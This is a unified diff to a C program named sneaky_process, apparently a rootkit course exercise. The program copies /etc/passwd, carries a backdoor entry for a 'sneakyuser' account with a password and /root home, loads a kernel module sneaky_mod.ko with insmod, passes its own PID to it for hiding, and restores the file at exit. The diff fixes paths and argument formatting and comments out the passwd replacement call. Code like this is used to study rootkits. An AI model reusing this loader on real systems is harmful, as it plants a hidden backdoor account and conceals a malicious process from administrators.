@@ -2,13 +2,13 @@
 #include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <unistd.h>
-
-#define REAL_PWD "etc/passwd"
-#define FAKE_PWD "tmp/passwd"
+#define REAL_PWD "/etc/passwd"
+#define FAKE_PWD "/tmp/passwd"
 #define SNEAKY_USER "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash"
 
 int replace_pwd() {
@@ -28,7 +28,7 @@ int replace_pwd() {
   while (1) {
     byte_read = read(real_pwd, read_buf, sizeof(read_buf));
 
-    if (byte_read < 0) {
+    if ((int)byte_read < 0) {
       printf("REPLACE_PWD:byte_read < 0,read error!\n");
       return -1;
     } else if (byte_read == 0) {
@@ -77,7 +77,7 @@ int restore_pwd() {
   while (1) {
     byte_read = read(real_pwd, read_buf, sizeof(read_buf));
 
-    if (byte_read < 0) {
+    if ((int)byte_read < 0) {
       printf("RESOTRE_PWD:byte_read < 0,read error!\n");
       return -1;
     } else if (byte_read == 0) {
@@ -93,14 +93,17 @@ int restore_pwd() {
   }
 }
 
-int insert_module(pid_t id) {
-  char buffer[40];
-  snprintf(buffer, 40, "%d", id);
+int insert_module(char *sneaky_id) {
+  char sneaky_pid[64];
+  memset(sneaky_pid, 0, sizeof(sneaky_pid));
+
+  snprintf(sneaky_pid, sizeof(sneaky_pid), "sneaky_pid=%d", getpid());
+
   char *arguments[4];
 
   arguments[0] = "insmod";
   arguments[1] = "sneaky_mod.ko";
-  arguments[2] = buffer;
+  arguments[2] = sneaky_id;
   arguments[3] = NULL;
   return execvp(arguments[0], arguments);
 }
@@ -133,9 +136,13 @@ int remove_module() {
 
 int main(int argc, char *argv[]) {
   printf("sneaky_process pid = %d\n", getpid());
-  replace_pwd(); // copy the /etc/passwd file to /tmp/passwd
+  // replace_pwd(); // copy the /etc/passwd file to /tmp/passwd
+  printf("after replace_pwd()\n");
+  char sneaky_pid[64];
+  memset(sneaky_pid, 0, sizeof(sneaky_pid));
 
-  pid_t sneaky_id = getpid();
+  snprintf(sneaky_pid, sizeof(sneaky_pid), "sneaky_pid=%d", getpid());
+
   pid_t pid = fork();
   int status;
   if (pid == -1) {
@@ -143,7 +150,7 @@ int main(int argc, char *argv[]) {
     exit(EXIT_FAILURE);
   } else if (pid == 0) { // child
 
-    if (insert_module(sneaky_id) < 0) {
+    if (insert_module(sneaky_pid) < 0) {
       perror("failed to insert module\n");
     }
   } else { // parent
@@ -164,5 +171,6 @@ int main(int argc, char *argv[]) {
       }
     }
   }
+  restore_pwd();
   return EXIT_SUCCESS;
 }
